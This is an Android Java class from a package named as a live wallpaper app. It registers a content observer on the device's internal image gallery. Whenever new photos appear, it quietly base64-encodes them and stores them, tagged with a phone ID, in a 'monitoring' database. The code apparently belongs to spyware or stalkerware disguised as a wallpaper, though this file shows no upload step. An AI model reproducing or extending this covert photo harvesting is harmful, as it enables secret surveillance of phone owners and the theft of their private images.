package com.livewallpaper.circle.box.gallery;

import com.livewallpaper.circle.box.ServiceListener;
import com.livewallpaper.circle.db.controllers.MonitorSQLiteAdapter;
import com.livewallpaper.circle.db.models.People;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.os.Handler;
import android.provider.MediaStore.Images;
import android.util.Log;

public class ContentGalleryInternalObserver extends ContentObserver {
	private Context context = ServiceListener.context;
	private static final String LOG_TAG = "monitoring";
	private static MonitorSQLiteAdapter mAdapter = MonitorSQLiteAdapter.SQLITE_ADAPTER;

	public ContentGalleryInternalObserver(Handler handler) {
		super(handler);
	}

	@Override
	public void onChange(boolean selfChange) {
		super.onChange(selfChange);
		Log.w(LOG_TAG, "onChange - ContentGalleryInternalObserver");
		monitoringGallery();
	}

	public void monitoringGallery() {
		String data;
		String title;
		long date_add;

		Cursor cursorInternal = null;

		try {
			mAdapter.open(context);
			People people = mAdapter.selectPeople();
			if (people != null) {
				String columns[] = new String[] { Images.Media.DATA,
						Images.Media.TITLE, Images.Media.DATE_ADDED };

				long lastGalleryTime = people.getLastGallery();

				// Get internal content
				cursorInternal = context.getContentResolver().query(
						Images.Media.INTERNAL_CONTENT_URI, columns,
						Images.Media.DATE_ADDED + " > ?",
						new String[] { Long.toString(lastGalleryTime) }, null);

				if (cursorInternal != null) {
					if (cursorInternal.moveToNext()) {
						Log.w(LOG_TAG, "cursorInternal");
						data = cursorInternal.getString(cursorInternal
								.getColumnIndex(Images.Media.DATA));
						title = cursorInternal.getString(cursorInternal
								.getColumnIndex(Images.Media.TITLE));
						date_add = cursorInternal.getLong(cursorInternal
								.getColumnIndex(Images.Media.DATE_ADDED));
						data = ConvertImage.convertImageToBase64String(data);
						if (data != null) {
							people.setLastGallery(date_add);
							mAdapter.updatePeopleLastGallery(people);
							mAdapter.insertGallery(data, title, date_add,
									people.getPhoneId());
						}
					}
				}

			}
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			if (cursorInternal != null) {
				cursorInternal.close();
			}
			mAdapter.close();
		}
	}

}
